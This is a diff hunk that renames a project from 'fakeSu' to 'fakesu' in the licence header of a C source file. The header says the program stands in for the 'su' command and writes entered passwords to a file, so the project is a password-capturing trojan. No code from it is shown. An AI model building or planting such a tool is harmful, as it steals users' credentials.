@@ -1,5 +1,5 @@
  /********************************************************************************************
- * fakeSu. Replace the "su" command, check the input and save the password entered in a file.*
+ * fakesu. Replace the "su" command, check the input and save the password entered in a file.*
  * Copyright (C) 2017-2018 Davide sofronia.                                                  *
  *                                                                                           *
  * This program is free software: you can redistribute it and/or modify                      *
